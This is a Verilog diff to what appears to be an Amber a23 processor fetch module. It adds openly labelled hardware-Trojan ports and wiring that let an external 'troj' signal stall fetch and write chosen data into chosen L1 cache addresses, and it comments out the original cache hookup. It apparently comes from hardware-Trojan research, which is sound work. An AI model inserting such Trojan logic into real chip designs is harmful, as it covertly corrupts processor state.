@@ -62,7 +62,7 @@ input       [31:0]          i_cacheable_area,   // each bit corresponds to 2MB a
 input                       i_system_rdy,
 
 input						i_troj_reserve,		/// Trojan signal to stall fetch
-input		[31:0]			i_troj_write_data,	/// Trojan data written to cache
+input		[127:0]			i_troj_write_data,	/// Trojan data written to cache
 input		[31:0]			i_troj_address,		
 input		[31:0]			i_troj_address_nxt,
 output					o_cache_stall,
@@ -126,6 +126,9 @@ wire [31:0] 	troj_address_nxt;
 wire [3:0]	troj_byte_enable;
 wire		troj_wb_stall;
 
+wire [31:0]	troj_wb_read_data;
+wire [31:0] 	troj_wb_addr;
+
 assign troj_sel 		= i_troj_reserve ? 1 : sel_cache;
 assign troj_excl 		= i_troj_reserve ? 0 : i_exclusive;
 assign troj_write_data		= i_troj_reserve ? i_troj_write_data : i_write_data;
@@ -133,10 +136,44 @@ assign troj_write_enable	= i_troj_reserve ? 1 : i_write_enable;
 assign troj_address		= i_troj_reserve ? i_troj_address : i_address;
 assign troj_address_nxt 	= i_troj_reserve ? i_troj_address_nxt : i_address_nxt;
 assign troj_byte_enable		= i_troj_reserve ? 4'b0 : i_byte_enable;
-assign troj_wb_stall		= i_troj_reserve ? 1 : o_wb_stb & ~i_wb_ack;
+
+assign troj_wb_stall		= i_troj_reserve ? 0 : o_wb_stb & ~i_wb_ack;
+assign troj_wb_read_data	= i_troj_reserve ? i_troj_write_data : i_wb_dat;
+assign troj_wb_addr		= i_troj_reserve ? i_troj_address : o_wb_adr;
 
 assign o_cache_stall 		= cache_stall;
 
+
+// ======================================
+// L1 Cache (Unified Instruction and Data)
+// ======================================
+a23_cache u_cache (
+    .i_clk                      ( i_clk                 ),
+     
+    .i_select                   ( sel_cache        	),
+    .i_exclusive                ( i_exclusive           ),
+    .i_write_data               ( i_write_data          ),
+    .i_write_enable             ( i_write_enable        ),
+    .i_address                  ( i_address             ),
+    .i_address_nxt              ( i_address_nxt         ),
+    .i_byte_enable              ( i_byte_enable         ),
+    .i_cache_enable             ( i_cache_enable        ),
+    .i_cache_flush              ( i_cache_flush         ),
+    .o_read_data                ( cache_read_data       ),
+    
+    .o_stall                    ( cache_stall           ),
+    .i_core_stall               ( o_fetch_stall         ),
+    .o_wb_req                   ( cache_wb_req          ),
+    .i_wb_address               ( o_wb_adr              ),
+    .i_wb_read_data             ( i_wb_dat              ),
+    .i_wb_stall                 ( o_wb_stb & ~i_wb_ack  ),
+
+    .i_troj_reserve		( i_troj_reserve	),
+    .i_troj_data		( i_troj_write_data  	),
+    .i_troj_addr		( i_troj_address	)
+);
+
+/*
 // ======================================
 // L1 Cache (Unified Instruction and Data)
 // ======================================
@@ -161,7 +198,7 @@ a23_cache u_cache (
     .i_wb_read_data             ( i_wb_dat              ),
     .i_wb_stall                 ( troj_wb_stall	        )
 );
-
+*/
 
 
 // ======================================
